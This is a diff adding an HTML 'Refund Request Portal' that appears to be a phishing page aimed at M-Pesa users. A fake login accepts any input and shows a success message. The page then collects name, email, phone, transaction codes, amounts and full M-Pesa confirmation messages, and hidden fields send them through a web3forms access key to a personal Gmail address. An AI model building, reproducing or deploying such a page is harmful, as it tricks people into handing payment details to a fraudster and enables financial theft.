@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Refund Request Portal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root {
+  --primary:#4f46e5;
+  --bg:#0f172a;
+  --card:#020617;
+  --text:#e5e7eb;
+  --success:#22c55e;
+}
+* { box-sizing:border-box; font-family:Arial, sans-serif; }
+body {
+  margin:0; background:var(--bg); color:var(--text);
+  display:flex; justify-content:center; align-items:center; min-height:100vh;
+}
+.container {
+  width:100%; max-width:420px; background:var(--card);
+  padding:25px; border-radius:12px; box-shadow:0 0 30px #000;
+}
+h2 { text-align:center; margin-bottom:20px; }
+input, textarea, button {
+  width:100%; padding:12px; margin-bottom:12px;
+  border-radius:8px; border:none;
+}
+input, textarea { background:#020617; color:white; border:1px solid #1e293b; }
+button {
+  background:var(--primary); color:white; font-weight:bold;
+  cursor:pointer;
+}
+button:hover { opacity:0.9; }
+.step { display:none; }
+.step.active { display:block; }
+.feedback {
+  background:rgba(34,197,94,.15);
+  color:var(--success);
+  padding:10px; border-radius:8px;
+  margin-bottom:12px; display:none;
+}
+.progress {
+  text-align:center; margin-bottom:10px; font-size:14px;
+  opacity:.8;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- LOGIN -->
+<div class="step active" id="login">
+  <h2>Refund Login</h2>
+  <div class="feedback" id="loginMsg">Login successful</div>
+  <input id="loginEmail" placeholder="Email used" required>
+  <input id="loginPhone" placeholder="Phone used" required>
+  <button onclick="login()">Login</button>
+</div>
+
+<form
+  class="step"
+  id="form"
+  action="https://api.web3forms.com/submit"
+  method="POST">
+
+<input type="hidden" name="access_key" value="741555bd-85f5-47b0-91ce-c54b65af9109">
+<input type="hidden" name="to_email" value="londonmarkv@gmail.com">
+
+<!-- STEP 1 -->
+<div class="step" id="s1">
+  <div class="progress">Step 1 of 5</div>
+  <div class="feedback">Details saved</div>
+  <input name="Full Name" placeholder="Full Name" required>
+  <input name="Email" placeholder="Email" required>
+  <button type="button" onclick="next(1)">Continue</button>
+</div>
+
+<!-- STEP 2 -->
+<div class="step" id="s2">
+  <div class="progress">Step 2 of 5</div>
+  <div class="feedback">Transaction recorded</div>
+  <input name="Transaction Code" placeholder="MPesa Transaction Code" required>
+  <input name="Amount" placeholder="Amount Sent" required>
+  <button type="button" onclick="next(2)">Continue</button>
+</div>
+
+<!-- STEP 3 -->
+<div class="step" id="s3">
+  <div class="progress">Step 3 of 5</div>
+  <div class="feedback">Reason noted</div>
+  <textarea name="Refund Reason" placeholder="Why are you requesting a refund?" required></textarea>
+  <button type="button" onclick="next(3)">Continue</button>
+</div>
+
+<!-- STEP 4 -->
+<div class="step" id="s4">
+  <div class="progress">Step 4 of 5</div>
+  <div class="feedback">MPesa message captured</div>
+  <textarea name="MPesa Message" placeholder="Paste full MPesa confirmation message" required></textarea>
+  <button type="button" onclick="next(4)">Continue</button>
+</div>
+
+<!-- STEP 5 -->
+<div class="step" id="s5">
+  <div class="progress">Step 5 of 5</div>
+  <div class="feedback">Ready to submit</div>
+  <p>Please confirm all details before submission.</p>
+  <button type="submit">Submit Refund Request</button>
+</div>
+
+</form>
+
+</div>
+
+<script>
+function login(){
+  if(loginEmail.value && loginPhone.value){
+    document.getElementById("loginMsg").style.display="block";
+    setTimeout(()=>{
+      document.getElementById("login").classList.remove("active");
+      document.getElementById("form").classList.add("active");
+      document.getElementById("s1").classList.add("active");
+    },800);
+  }
+}
+
+function next(n){
+  const step = document.getElementById("s"+n);
+  step.querySelector(".feedback").style.display="block";
+  setTimeout(()=>{
+    step.classList.remove("active");
+    document.getElementById("s"+(n+1)).classList.add("active");
+  },700);
+}
+</script>
+
+</body>
+</html>
